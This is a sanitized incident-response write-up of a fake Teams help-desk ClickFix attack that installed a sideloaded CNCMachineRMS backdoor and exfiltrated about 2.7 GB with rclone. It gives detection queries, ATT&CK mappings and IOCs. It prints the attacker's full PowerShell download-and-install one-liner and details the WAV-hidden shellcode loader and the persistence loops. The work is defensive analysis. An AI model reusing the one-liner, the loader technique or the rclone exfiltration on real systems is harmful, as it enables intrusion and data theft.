---
id: teams-clickfix-sideload-rclone
title: "Teams ClickFix to a Sideloaded Backdoor and rclone Exfiltration"
summary: "A fake help desk on Teams, a ClickFix paste, a trojanized file-search installer, and 2.7 GB uploaded with rclone seven hours later."
category: DFIR
date: 2026-10-05
tags: [clickfix, social-engineering, dll-sideload, rat, delivery-chain, windows, malware, cncmachinerms, rclone]
---

# Teams ClickFix to a Sideloaded Backdoor and rclone Exfiltration

*Sanitized: no client-identifying details. IOCs shared for defensive use.*

## TL;DR

- An external "help desk" account on Teams had a user paste a PowerShell one-liner that installed a trojanized file-search tool
- A vendor DLL in the package was patched after signing, so the signed `IndexManager.exe` loads attacker code that decodes its payload out of a WAV file
- The backdoor sat quiet for seven hours, then dropped `rclone` and uploaded about 2.7 GB to S3-compatible storage
- Defender flagged the upload in seconds; the SOC isolated the host 36 minutes after the first high-severity alert. One workstation, no lateral movement

```
CLASS   : Social engineering / backdoor / data exfiltration
VECTOR  : External Teams "help desk" chat, pasted PowerShell one-liner, MSI
IMPLANT : CNCMachineRMS-family backdoor, sideloaded through IndexManager.exe
C2      : 91.92.33[.]24:443, gate resolved through public DNS-over-HTTPS
IMPACT  : ~2.7 GB (334 files flagged) uploaded to IDrive e2 with rclone
TTC     : 36 min from first high-severity alert to isolation
```

## Attack Chain

```
External Teams "help desk" → user pastes PowerShell one-liner
  → hxxps://justchillbahrein[.]com/Secure-PDFDiamond.zip → msiexec /i
  → IndexManager.exe (signed) → ConfigUILib.dll (patched after signing)
  → apiModel.dll reads LibraryPipelines.wav, waits 62 s, runs shellcode
  → runtime opens Compress.db → script: Run key + task, loads implant
  → HTTPS to 91.92.33[.]24:443 → T+6 h discovery → rclone → IDrive e2
```

## What happened

An external account posing as the help desk messaged the user about seven minutes before the command ran. Just before the paste the user ran two `net group /dom` lookups in PowerShell, which looks like live coaching; we have alert data, not the chat, so that is inference.

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "$url='hxxps://justchillbahrein[.]com/Secure-PDFDiamond.zip'; $zip=Join-Path $env:TEMP 'Secure-PDFDiamond.zip'; $dir=Join-Path $env:TEMP 'unpack'; Invoke-WebRequest $url -OutFile $zip -UseBasicParsing; Expand-Archive $zip -DestinationPath $dir -Force; $msi=Get-ChildItem $dir -Filter *.msi -Recurse | Select-Object -First 1; Start-Process msiexec.exe -ArgumentList '/i', $msi.FullName,'/norestart' -Wait; Remove-Item $zip,$dir -Recurse -Force"
```

The MSI writes 23 executables and DLLs (about 54 MB) to `%LOCALAPPDATA%\Programs\FileLocator Index Manager\` and launches the signed `IndexManager.exe` as soon as it finishes. Two minutes later that process connected out over HTTPS and queried a public DNS-over-HTTPS resolver directly, bypassing the organization's DNS logs. A Run-key value named "FL Smart Index Manager" followed at T+4 and a scheduled task of the same name at T+16. Defender blocked a persistence behavior at T+5, yet the backdoor was back at the next sign-in.

Six quiet hours later a shell ran `net use`, `net view` against a file server and `ipconfig /all`, and the host process wrote `rclone.exe` into the user's Music folder. Its first run raised a high-severity exfiltration alert in the same second; Defender stopped it three minutes on. The operator swapped in a renamed build, `iclone.exe` (Defender flagged its mismatched original filename), then a second one. The commands were stock rclone: `config create` for an IDrive e2 remote, then `copy` with `--include` filters for document, email, database and backup extensions.

Two 15-minute windows carried 0.7 GB and 2.0 GB. Defender's DLP telemetry named 334 files, 32 tagged as exfiltrated; given the byte count I treat all 334 as sent. The upload used the user's home connection, not the VPN, so only the endpoint saw it. We reset the user's credentials and blocked every indicator below; scoping found no lateral movement and no other credential theft. Still open: the exact file list (the file server's audit log is the authority), whether the copy was downloaded elsewhere, and the gate configuration, which should be in `client_local_settings.bin` beside `IndexManager.exe` if it is still on disk.

## Inside the loader

Initial triage named `RegisterIdr.dll` as the loader, but the package holds five attacker files and it isn't the first to load. `ConfigUILib.dll` is a genuine vendor DLL patched after signing to import `apiModel.dll`. That DLL starts a thread on load, reads 341,475 bytes from offset `0x30cea` of `LibraryPipelines.wav`, XOR-decodes them, sleeps 62 seconds, and runs the result from a random-filled RWX buffer by passing it to `EnumSystemCodePagesW` as a callback. `RegisterIdr.dll` supplies the allocation and that call.

The decoded blob opens `Compress.db`, a custom container of 1,128 entries whose main entry is a script. It re-creates the Run key every 150 seconds and the task every 875 seconds, then loads the real implant, a 1.58 MB blob. Both persistence entries point at the host process, so every restart re-runs the sideload. The implant matches public reporting on the CNCMachineRMS framework; no source I found attributes it to an actor.

## Timeline

T is the moment the pasted command ran.

| Time | What happened |
| --- | --- |
| T−7 to T−2 min | Teams message from the "help desk"; two `net group /dom` lookups |
| T+0 | Pasted one-liner installs the MSI |
| T+2 min | First HTTPS connection to the C2 IP; DoH lookups |
| T+4 / T+5 min | Run key written; Defender blocks a persistence behavior (low) |
| T+16 min | Scheduled task created |
| T+6 h 20 min | `net use`, `net view`, `ipconfig /all` |
| T+6 h 57 min | `rclone.exe` dropped |
| T+7 h | First rclone run; high-severity alert; Defender stops it at T+7 h 3 min |
| T+7 h 7 min | Renamed `iclone.exe` runs; a second build is swapped in at T+7 h 26 min |
| T+7 h 36 min | SOC isolates the machine |
| Next day | Backdoor restarts at sign-in; the isolated host makes no C2 connection |

## How I know

- **The sideload chain is real.** Signed `ConfigUILib.dll` imports unsigned `apiModel.dll`, and its recomputed Authenticode digest doesn't match its signature while the controls, `IndexManager.exe` and `SearchLib.dll`, do. High for the files; I have no image-load event for the runtime load, so that half stays assessed.
- **The payload is in the WAV.** Ghidra gave the offset, length and decoder; reproducing it in Python turned entropy 7.39 into x64 code (5.54) with a normal function prologue. High.
- **The persistence timing fits the script.** A 62-second wait ending near T+2 plus the 150 s and 875 s timers predicts a Run key near T+4 and a task near T+16, which is what telemetry shows, and the loops explain why persistence survived the T+5 block. Medium-high: a timing match, not a log of the script firing.
- **The family is CNCMachineRMS.** `CNCMachineRMS\tasks` decrypts out of the implant, and the script syntax, DoH trio and container layout match LevelBlue SpiderLabs and Huntress reporting. High for family, nothing for an actor. The C2 address comes from telemetry; I never recovered the gate from the binaries, and the `CRATER_HOMEDIR\hryak_packages_x64` build path leaked in a log inside the MSI has no public hits.

## Detection

Written for Defender XDR Advanced Hunting. They also run in Sentinel where the Defender XDR connector streams the table (`Timestamp` exists in both).

```kql
// rclone, including renamed builds: original filename differs from the name on disk, or S3-style copy flags
// Status: untested
DeviceProcessEvents
| where (ProcessVersionInfoOriginalFileName =~ "rclone.exe" and FileName !~ "rclone.exe")
    or (ProcessCommandLine has_all ("copy", "--include", "--max-age", "--transfers"))
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessFolderPath
```

```kql
// A non-browser process connecting to a public DNS-over-HTTPS resolver
// Status: untested (RemoteUrl can be empty when only an IP was logged)
DeviceNetworkEvents
| where ActionType == "ConnectionSuccess"
| where RemoteUrl has_any ("dns.google", "cloudflare-dns.com", "dns.quad9.net")
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe")
| summarize Connections = count(), FirstSeen = min(Timestamp)
    by DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath
```

- An image load of `apiModel.dll` or `RegisterIdr.dll` by `IndexManager.exe` is high-signal; I haven't tested a `DeviceImageLoadEvents` query for it.
- A Run key or task that reappears within minutes of deletion is a loop. Kill the process first, then remove both.

## ATT&CK

| ID | Technique | Where |
|----|-----------|-------|
| T1566.003 | Phishing: Spearphishing via Service | External Teams "help desk" |
| T1204.004 | User Execution: Malicious Copy and Paste | Pasted one-liner |
| T1574.001 | Hijack Execution Flow: DLL | Patched `ConfigUILib.dll` loads `apiModel.dll` |
| T1027 | Obfuscated Files or Information | XOR-encoded WAV, hashed APIs, encrypted strings |
| T1620 | Reflective Code Loading | Shellcode and implant run from memory |
| T1497.003 | Virtualization/Sandbox Evasion: Time Based Checks | 62-second wait |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | `FL Smart Index Manager` |
| T1053.005 | Scheduled Task/Job: Scheduled Task | `FL Smart Index Manager` |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTPS C2, DoH |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | rclone to IDrive e2 |

## IOCs

### Network

```
justchillbahrein[.]com / 93.157.138[.]177         Payload host
hxxps://justchillbahrein[.]com/Secure-PDFDiamond.zip
91.92.33[.]24:443                                 C2, contacted by IndexManager.exe
s3.us-central-1.idrivee2[.]com / 76.8.23[.]66     Upload endpoint (IDrive e2, S3-compatible)
dns[.]google, cloudflare-dns[.]com, dns[.]quad9[.]net   Legitimate DoH resolvers: the signal is the process, not the domain
```

### Hashes

```
Secure-PDFDiamond.msi       1103f25776348f38cd606f98f1b0d802f4c800b2b9942d58a83b94883d23b1cb
RegisterIdr.dll             fd2b72d1a59a2c1d9d5d231f646153efe2a8ca981a37609b5d726d6c6f0cdeab
apiModel.dll                4337f8c12c0ec3aae176e3d0d3b655643384167a18d1189d227580430ccbf0d8
PCS-CakeSM.dll              29c9bf11242858897de488fa28c1fa96a134ba46a9b49af0024728a56ce12975
ConfigUILib.dll (patched)   03497e8aa5627f4f7df7414051cc395a6c09813d64a554df16af64e21ac9d1d7
LibraryPipelines.wav        f5c2846239a2d6143bc0686f68161284eb728b53fe756c00c418c4364b87df0a
Compress.db                 181b024e65858d9d7fb1ef110eb554791fd60436906248cd51e62d8598c66d34
stage 2 (decoded WAV)       9f03b58b46253bb533104b38257b867bf60a9318f51e1471e17b2a7fa12dfe9b
stage 3 script (UTF-16)     bc99f99aa030e5da809aeb9ab01b4b782311c0f7471efe5a49a365031e2a4ee4
implant ("input")           8f6dbc8f53b181da32a02e5c1a49d026ad225f72d2a646e66248aa3ffdd5449e
rclone.exe                  033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c
iclone.exe (1st)            22f62fa53abf6c30e0e36acc41eebb90af8ee6072001e846fa13cfc3077f6ed7
iclone.exe (2nd)            4779b229343510429eddd4a8e3cad028a2b395cb7e6c05c588525df2c98143df
```

`IndexManager.exe` is a legitimate program, so judge it by where it runs from, not by its hash.

### Host

```
%LOCALAPPDATA%\Programs\FileLocator Index Manager\   (23 executables and DLLs, plus data files)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run   value "FL Smart Index Manager"
Scheduled task "FL Smart Index Manager"
<install dir>\client_local_settings.bin              implant settings, if present
%USERPROFILE%\Music\rclone.exe, iclone.exe           dropped by the backdoor
MSI: Author/Manufacturer "Scene Group Limited", WiX 3.14.1.8722, ARPSYSTEMCOMPONENT=1
MSI UpgradeCode {139848DF-83F5-4634-B845-A35FF780FA46}
DLLs compiled: 2026-09-24 16:31 UTC (apiModel.dll, RegisterIdr.dll, PCS-CakeSM.dll)
Build path leaked in a log inside the MSI:
  F:\work\old\mal\CRATER_HOMEDIR\hryak_packages_x64\indexmanager\IndexManager.exe
Window name in the implant: xcrt_shutdown_monitor_window
Decrypted implant string: CNCMachineRMS\tasks
Storage container key: 0x72f07779 (1,128 entries)
```
